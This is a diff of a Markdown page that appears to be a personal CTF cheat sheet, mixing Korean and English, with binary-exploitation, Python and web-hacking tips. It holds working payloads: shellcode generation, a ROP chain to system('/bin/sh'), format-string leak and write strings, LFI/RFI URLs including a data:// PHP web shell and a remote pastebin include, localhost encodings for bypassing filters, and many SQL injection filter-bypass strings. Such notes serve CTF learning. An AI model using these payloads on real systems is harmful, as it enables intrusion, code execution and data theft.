@@ -9,38 +9,79 @@ sitemap :
   priority : 1.0
 ---
 
-* file 명령어로 봤을 때 stripped 돼있고 main 함수가 안 보인다면 start로 가면 libc_start_main으로 콜하는 데 그 중에서 첫번째 인자로 들어가는 주소가 main함수이다.
 
-* pwntools 쉘코드 생성
 
-  ```python
-  asm(shellcraft.amd64.sh(), arch='amd64')
-  ```
+# Binary Tips
 
-* 64 Bit ROP
+```
+file 명령어로 봤을 때 stripped 돼있고 main 함수가 안 보인다면 start로 가면 libc_start_main으로 콜하는 데 그 중에서 첫번째 인자로 들어가는 주소가 main함수이다.
+```
 
-  ```markdown
-  [buf] +  gadget [pop rdi; ret] + [/bin/sh string addr] + [system addr]
-  ```
 
-* 함수 오프셋
 
-  ```python
-  printf_off = e.symbols['printf']
-  system_off = e.symbols['system']
-  
-  libc_base = printf - printf_off
-  system = libc_base + system_off
-  
-  binsh = libc_base
-  binsh += e.search('/bin/sh').next()
-  ```
+> pwntools Create Shellcode 
+
+```python
+asm(shellcraft.amd64.sh(), arch='amd64')
+```
+
+
+
+> pwntools libc symbol
+
+```python
+leak_libc = ELF('./leak_libc')
+libc_system = libc_base_addr + leak_libc.symbols['system']
+```
+
+
+
+> 64 bit ROP
+
+```
+[buf] +  gadget [pop rdi; ret] + [/bin/sh string addr] + [system addr]
+```
+
+
+
+> Function Offset 
+
+```python
+printf_off = e.symbols['printf']
+system_off = e.symbols['system']
+
+libc_base = printf - printf_off
+system = libc_base + system_off
+
+binsh = libc_base
+binsh += e.search('/bin/sh').next()
+```
+
+
+
+> FSB
+
+스택 내 주소 한번에 출력
+
+스택의 1337번째의 값을 hex 값으로 출력 (info leak)
+
+```c
+printf("%LENGTH$08x"); -> printf("%1337$08x");
+```
+
+주소 값 한 번에 변조 
+
+스택의 12번째의 값에 저장되어 있는 주소에 앞에 출력된 바이트 수만큼 덮음
+
+```c
+printf("%LENGTH$n"); -> printf("%12$n");
+```
 
 
 
 # Python Tips
 
-XOR Tip
+> XOR
 
 두 개의 문자 xor연산 할 때 itertools cycle 모듈 사용해서 인덱스가 끝나도 처음으로 가서 계속 xor 연산 가능
 
@@ -62,8 +103,6 @@ print flag
 
 # Web Tips
 
-### POST
-
 > Use python requests
 
 ```python
@@ -72,21 +111,159 @@ import requests
 req = requests.post('주소', data={'name': value, cookies={'PHPSESSID': session})
 ```
 
-> Use cURL
-
-```shell
-curl -d "id=admin&pw=admin&press=Login" 주소
-```
-
-
-
-### Header
-
-> Use python requests
-
 ```python
 import requests
 head={'user-agent': 'Test'}
-req = requests.get('주소', headers=head)
+req = requests.get(ADDRESS, headers=head)
 ```
+
+
+
+> Use cURL
+
+```shell
+curl -d "id=admin&pw=admin&press=Login" ADDRESS
+```
+
+```shell
+curl ADDRESS -H 'header: header' --data 'data=data'
+```
+
+
+
+> LFI & RFI
+
+```
+http://URL/?page=php://filter/convert.base64-encode/resource=index.php
+
+http://URL/?page=php://filter/convert.base64-decode/resource=./upload/abcde
+
+http://URL/?page=data://text/plain,%3Cxmp%3E%3C?php%20system($_GET[%27x%27]);&x=ls%20-al
+
+http://URL/?page=http://pastebin.com/raw/abcd/?&x=ls%20-al
+```
+
+
+
+> 127.0.0.1
+
+```
+http://2130706433
+
+http://0x7f000001
+
+http://0x7f.0x00.0x00.0x01
+
+http://017700000001
+
+http://0177.000.000.01
+```
+
+
+
+> MySQL
+
+```
+다음 라인 : %0a //주석처리를 하더라도 다음 줄로 넘겨버리면 무시된다.
+주석 처리 : -- # ;%00 /**/
+파라미터가 두개 있을경우 \를 입력해 뒤의 '를 무력화 후 쿼리문을 스트링화 시키고 뒤에 파라미터에 exploit을 수행할 수 있다.
+%0a 말고도 %0b 등 대신 쓰일 수 있는 여러문자들이 있다.
+비교 문자 : = like in strcmp()
+문자 자르기 : strcmp left right mid Function
+and == &&, or ==||
+if ord Function Filtering : conv(hex(substr(pw,1,1)),16,10)
+공백 대신 : /**/ %09 %0a ()
+IF(substr(lpad(bin(ord(substr(password,1,1))),8,0),1,1)
+```
+
+
+
+> SQLI
+
+String Filtering [ preg_match - ex) admin]
+
+```php
+admin : 0x61646d696e 
+  			0b0110000101100100011011010110100101101110 
+  			char(0x61, 0x64, 0x6d, 0x69, 0x6e)
+```
+
+
+
+Blind SQL Injection Equal(=) Filltering
+
+```php
+substr('abc',1,1)like('a')
+if(strcmp(substr('abc',1,1),'a'),0,1)
+substr('abc',1,1)%20in('a')
+```
+
+
+
+substr Filtering
+
+```php
+right(left('abc',1),1)
+id > 0x41444d4941 'ADMIN' > 'ADMIA'(hex)
+```
+
+
+
+ereg, eregi
+
+```php
+'admin' Filtering -> 'AdmIN' bypass
+FRONT %00 INSERT -> 뒤에 문자 필터링 처리 안됨
+```
+
+
+
+replace, replaceAll, str_replace
+
+```php
+'admin' Filtering -> 'adadminmin'
+										 'admadminin'
+										 'admdmiadmdmiinin'
+```
+
+
+
+Numeric Character Filtering
+
+```php
+0 -> '!'='@' -> false
+1 -> '!'='!' -> true
+```
+
+
+
+White Space Filtering (%20)
+
+```
+%20 -> %0a %0b %0c %0d %09
+```
+
+
+
+Single Quoter Filtering (%27)
+
+```php
+Use Double Quote in Single Quote
+if '\' not Filtering
+-> select TEST from TABLE where id='\' and pw=' or 1#
+parameter : id=\&pw=%20or%201%23
+```
+
+
+
+Comment Injection
+
+```php
+'#'의 주석 범위는 1 line이다. 1 line을 나누는 기준은 %0a로 나눈다.
+-> select test1 from TABLE where id='abc'# and pw='%0a or id='admin'%23
+'/* */'
+-> select test1 from TABLE where id='abc'/* and pw=''*/ or id='admin'%23
+```
+
+
 
